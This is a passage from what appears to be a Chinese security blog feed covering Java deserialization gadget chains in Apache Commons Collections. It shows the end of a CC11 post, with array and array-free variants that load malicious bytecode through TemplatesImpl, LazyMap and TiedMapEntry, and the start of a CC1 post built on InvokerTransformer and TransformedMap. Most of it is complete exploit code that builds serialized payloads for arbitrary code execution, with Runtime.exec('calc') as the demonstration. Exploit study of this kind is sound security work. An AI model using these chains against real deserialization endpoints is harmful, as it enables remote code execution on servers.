<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span>templates.getClass();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">    name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    name.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">    bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">    <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">    bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">    tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">    templates.newTransformer();</span><br></pre></td></tr></table></figure>

<h4 id="un6zg">后半部分</h4>
<h5 id="Y0meL">调用newTransformer</h5>
CC6链流程

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">xxx.readObject()</span></span><br><span class="line"><span class="comment">	HashMap.put()</span></span><br><span class="line"><span class="comment">	HashMap.hash()</span></span><br><span class="line"><span class="comment">		TiedMapEntry.hashCode()</span></span><br><span class="line"><span class="comment">		TiedMapEntry.getValue()</span></span><br><span class="line"><span class="comment">			LazyMap.get()</span></span><br><span class="line"><span class="comment">				ChainedTransformer.transform()</span></span><br><span class="line"><span class="comment">					InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">						Runtime.exec()</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>

<p>这里就使用CC6的后半段代码，利用<code>TiedMapEntry</code>的<code>hashCode</code>方法，一步一步调用到<code>InvokerTransformer</code>，利用它来执行<code>newTransformer</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazymap</span> <span class="operator">=</span> LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazymap,<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        lazymap.put(tiedMapEntry,<span class="literal">null</span>);</span><br><span class="line">        lazymap.remove(<span class="literal">null</span>);</span><br></pre></td></tr></table></figure>

<blockquote>
<p>感觉CC6这里没有很熟练，将流程再分析一下</p>
</blockquote>
<h5 id="IWrdr">调用chainedTransformer.transformer</h5>

<p>调用transformer方法，这里用<code>LazyMap.get</code>去触发</p>
<p>从<code>get</code>方法中可以发现<code>factory.transform</code>的factory是可以在构造函数中赋值的，因此对于我们是可控的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//构造函数</span></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">LazyMap</span><span class="params">(Map map, Transformer factory)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="keyword">if</span> (factory == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Factory must not be null&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.factory = factory;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="kEVmU">调用get方法</h5>

<p>这里使用<code>TiedMapEntry</code>的<code>getValue</code>方法，我们可以从构造方法中看到map和key都是可控的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//构造方法</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">TiedMapEntry</span><span class="params">(Map map, Object key)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        <span class="built_in">this</span>.map = map;</span><br><span class="line">        <span class="built_in">this</span>.key = key;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h5 id="Vemi5">调用getValue</h5>

<p><code>getValue</code>方法，我们可以从本类的<code>hashCode</code>方法中找到调用</p>
<p>且该方法我们想到可以使用<code>HashMap</code>作为入口，这里<code>HashMap</code>入口调用<code>hashCode</code>不在赘述</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getValue();</span><br><span class="line">        <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">               (value == <span class="literal">null</span> ? <span class="number">0</span> : value.hashCode()); </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="XWg9m">EXP编写</h4>

<p>这里我们的EXP就已经写完了，但是我们发现在<code>put</code>时，就已经触发了计算器，是因为在put时也会触发其<code>hashCode</code>方法我们也和CC6一样，先改为无用的东西，后面通过反射调用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">TemplatesImpl</span>&gt; tc = templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] eval = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;eval&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(expMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>通过修改以后，我们的代码就可以成功序列化，并在反序列化执行恶意类加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">TemplatesImpl</span>&gt; tc = templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] eval = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;eval&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        lazyMap.remove(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">Map</span>&gt; lazyMapClass = lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(expMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741087011681-0864d6fd-0f51-4b44-8c5d-19a72da2618d.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741087011681-0864d6fd-0f51-4b44-8c5d-19a72da2618d.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h3 id="heBQB">无数组攻击链</h3>
无数组的CC11攻击链常用于攻击shiro时使用

<p>无数组相比于有数组的差异，只在调用<code>InvokerTransformer.transform(templates)</code>时，传入templates参数的地方有一些差异</p>
<p>有数组攻击链，利用<code>ChainedTransformer</code>的递归调用，和<code>ConstantTransformer</code>的指定返回类来传参</p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741087513248-dcd832e1-3f04-4b68-8883-2b1575f1c254.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741087513248-dcd832e1-3f04-4b68-8883-2b1575f1c254.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p>而无数组的攻击链，参数是从<code>getValue</code>调用<code>LazyMap</code>的<code>get</code>方法时传入的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getValue</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//LazyMap</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">get</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">        <span class="comment">// create value for key if key is not currently in the map</span></span><br><span class="line">        <span class="keyword">if</span> (map.containsKey(key) == <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> factory.transform(key);</span><br><span class="line">            map.put(key, value);</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> map.get(key);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>因此我们只需要做一些简单的替换即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">TemplatesImpl</span>&gt; tc = templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">name</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        name.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        name.set(templates,<span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodes</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodes.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] eval = Files.readAllBytes(Paths.get(<span class="string">&quot;F:\\temporary\\Test.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;eval&#125;;</span><br><span class="line">        bytecodes.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        <span class="type">Field</span> <span class="variable">tfactory</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">        tfactory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        tfactory.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>, <span class="literal">null</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">lazyMap</span> <span class="operator">=</span> LazyMap.decorate(hashMap, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line"><span class="comment">//        Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer);</span></span><br><span class="line"></span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, templates);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; expMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        expMap.put(tiedMapEntry,<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        lazyMap.remove(templates);</span><br><span class="line"></span><br><span class="line">        Class&lt;? <span class="keyword">extends</span> <span class="title class_">Map</span>&gt; lazyMapClass = lazyMap.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">factory</span> <span class="operator">=</span> lazyMapClass.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">        factory.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        factory.set(lazyMap,invokerTransformer);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        serialize(expMap);</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741087717823-53707e86-aabb-4303-acf0-809ad9fa22f9.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741087717823-53707e86-aabb-4303-acf0-809ad9fa22f9.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>CC链</tag>
      </tags>
  </entry>
  <entry>
    <title>CC1链</title>
    <url>/2025/02/22/CC1%E9%93%BE/</url>
    <content><![CDATA[<h1 id="N9Uwl">CC1链</h1>
<h2 id="mj2qI">前置基础</h2>

<p><strong>Java反序列化原理：</strong></p>
<p>接受任意对象，执行readObject方法</p>
<ol>
<li>若有一个A的readObject方法，调用了O1.method1方法，则我们可以修改这个O1</li>
<li>且在O1.method1方法中，调用了O2.method2方法，则我们可以修改这个O2</li>
<li>……</li>
<li>最后调用了危险方法（Runtime.getRuntime.exec()）</li>
</ol>
<p>最后调用危险方法有两种类型：</p>
<ol>
<li>不同类的同名函数</li>
<li>任意方法调用（反射&#x2F;动态加载恶意字节码）</li>
</ol>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734592977931-4c3b2aaf-3f71-4f10-932e-7dc1662a4fba.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734592977931-4c3b2aaf-3f71-4f10-932e-7dc1662a4fba.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<p><strong>注意：</strong></p>
<p><strong>A ：可序列化</strong></p>
<p><strong>重写readObject</strong></p>
<p><strong>接受任意对象作为参数</strong></p>
<p><strong>On : 可序列化</strong></p>
<p><strong>集合类型&#x2F;接受Object&#x2F;接受Map</strong></p>
<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734804680861-66dd5a9f-af67-413b-8339-5029b5481a34.png" class="lazyload placeholder" data-srcset="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1734804680861-66dd5a9f-af67-413b-8339-5029b5481a34.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p>
<h2 id="lXwnL">CC1攻击链分析</h2>
Transformer接口

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Transformer是一个接口类，提供对象转换方法transform（接收对象，并对对象做出操作）</p>
<p>重要的实现方法有：</font><code>ConstantTransformer</code><font style="color:rgb(77, 77, 77);">、</font><code>invokerTransformer</code><font style="color:rgb(77, 77, 77);">、</font><code>ChainedTransformer</code><font style="color:rgb(77, 77, 77);">、</font><code>TransformedMap</code><font style="color:rgb(77, 77, 77);"></p>
<h3 id="KsDgt"><font style="color:rgb(77, 77, 77);">危险方法</font></h3>
<font style="color:rgb(77, 77, 77);">这里我们找到</font><font style="color:rgb(77, 77, 77);">InvokerTransformer类，该类中存在一个反射调用任意类，可以作为链子的终点</font>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下面是该类的<code>transform</code>方法，用反射获取方法并<code>invoke</code>执行</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">            <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line">                </span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; does not exist&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; cannot be accessed&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">FunctorException</span>(<span class="string">&quot;InvokerTransformer: The method &#x27;&quot;</span> + iMethodName + <span class="string">&quot;&#x27; on &#x27;&quot;</span> + input.getClass() + <span class="string">&quot;&#x27; threw an exception&quot;</span>, ex);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol>
<li>使用InvokerTransformer中可执行任意方法，下面是反射调用</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">runtime</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">Method</span> <span class="variable">exec</span> <span class="operator">=</span> runtime.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        exec.invoke(rt,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>现在使用InvokerTransformer来调用calc</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(rt);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="M9rlJ">调用transform方法</h3>

<p>在<code>TransformedMap</code>中的<code>checkSetValue</code>方法调用了<code>valueTransformer</code>的<code>transform</code>方法</p>
<p>这里的valueTransformer在构造函数中初始化，但由于构造函数为protected属性，我们找到了本类中的decorate方法可以去构造一个TransformedMap</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title function_">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">TransformedMap</span>(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(map);</span><br><span class="line">        <span class="built_in">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="built_in">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">checkSetValue</span><span class="params">(Object value)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="Svlmc">调用checkSetValue</h3>

